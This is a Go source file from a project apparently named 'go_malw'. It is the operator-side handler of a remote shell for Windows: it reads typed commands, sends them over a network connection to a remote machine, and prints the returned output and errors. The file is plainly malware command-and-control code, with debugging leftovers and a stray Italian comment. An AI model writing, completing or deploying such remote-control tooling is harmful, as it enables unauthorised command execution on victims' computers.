package ExecuteCommandWindows

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"go_malw/server/core/color"
	"net"
	"os"
	"strings"
)

type Command struct {
	CmdOutput string
	CmdError  string
}

func ExecuteCommandRemotelyWindows(connection net.Conn) (err error) {

	ConnectionReader := bufio.NewReader(connection)
	initial_pwd_raw, err := ConnectionReader.ReadString('\n')
	initial_pwd := strings.TrimSuffix(initial_pwd_raw, "\n")

	reader := bufio.NewReader(os.Stdin)

	i := 10
	i = i + 1

	commandloop := true

	for commandloop {
		fmt.Print(color.Cyan + initial_pwd + "> " + color.Reset)
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println(color.Red + "[-]" + color.Reset + err.Error())
			continue
		}

		connection.Write([]byte(command))

		//println(command[0:3])
		/*nbytes, err := connection.Write([]byte(command))
		i = nbytes
		if err != nil {
			fmt.Println(color.Red + "[-] " + color.Reset + err.Error())
		}
		new_pwd, err := ConnectionReader.ReadString('\n')
		initial_pwd = new_pwd*/

		fmt.Println(command)

		if command == "4\n" {
			//VA QUI!!!
			println(color.Red + "[-]" + color.Reset + " Bad Command")
			commandloop = false
			continue
		} else if command == "1\n" {
			println(color.Red + "[-]" + color.Reset + " Bad Command")
			commandloop = false
			continue
		} else if command == "2\n" {
			println(color.Red + "[-]" + color.Reset + " Bad Command")
			commandloop = false
			continue
		} else if command == "3\n" {
			println(color.Red + "[-]" + color.Reset + " Bad Command")
			commandloop = false
			continue
		} else if command[0:3] == "cd " {
			println(color.Red + "[-]" + color.Reset + " Bad Command")
			commandloop = false
			continue
		} else if command == "5\n" {
			println(color.Red + "[-]" + color.Reset + " Bad Command")
			commandloop = false
			continue
		} else if command == "99\n" {
			println(color.Red + "[-]" + color.Reset + " Bad Command")
			commandloop = false
			continue
		} else if command == "stop\n" {
			commandloop = false
			continue
		} else {
			cmdStruct := &Command{}

			decoder := gob.NewDecoder(connection)
			err = decoder.Decode(cmdStruct)
			if err != nil {
				fmt.Println(color.Red + "[-]" + color.Reset + err.Error())
				continue
			}

			fmt.Println(cmdStruct.CmdOutput)
			if cmdStruct.CmdError != "" {
				fmt.Println(cmdStruct.CmdError)
			}
		}

	}

	return
}
